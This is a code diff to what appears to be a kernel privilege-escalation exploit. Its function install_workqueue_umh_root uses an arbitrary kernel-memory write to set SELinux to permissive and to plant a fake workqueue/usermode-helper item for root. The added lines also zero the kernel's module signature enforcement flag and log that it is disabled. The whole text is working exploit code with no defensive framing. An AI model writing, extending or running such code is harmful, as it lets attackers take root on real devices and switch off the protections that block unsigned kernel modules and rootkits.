@@ -131,6 +131,10 @@ static int root_hold_socket_ready(void) {
 static int install_workqueue_umh_root(int fd) {
   uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
   uint8_t permissive = 0;
+#ifdef MODULE_SIG_ENFORCE
+  uintptr_t module_sig_enforce_addr = data_addr(MODULE_SIG_ENFORCE);
+  uint8_t module_sig_permissive = 0;
+#endif
   uintptr_t fake_work_addr = page_base + ROOT_UMH_WORK_OFF;
   uintptr_t umh_data_addr = page_base + ROOT_UMH_DATA_OFF;
   struct umh_kernel_data umh_data;
@@ -181,6 +185,18 @@ static int install_workqueue_umh_root(int fd) {
     pr_error("root umh selinux write failed ret=%zd\n", selinux_write);
     return 0;
   }
+#ifdef MODULE_SIG_ENFORCE
+  ssize_t module_sig_write = kernel_write_data(
+      fd, module_sig_enforce_addr, &module_sig_permissive,
+      sizeof(module_sig_permissive));
+  if (module_sig_write != (ssize_t)sizeof(module_sig_permissive)) {
+    pr_error("root umh module signature write failed ret=%zd\n",
+             module_sig_write);
+    return 0;
+  }
+  pr_info("root umh module signature enforcement disabled addr=%016zx\n",
+          module_sig_enforce_addr);
+#endif
 
   uintptr_t wq_slot = data_addr(SYSTEM_UNBOUND_WQ);
   uintptr_t wq = root_read64(fd, wq_slot);
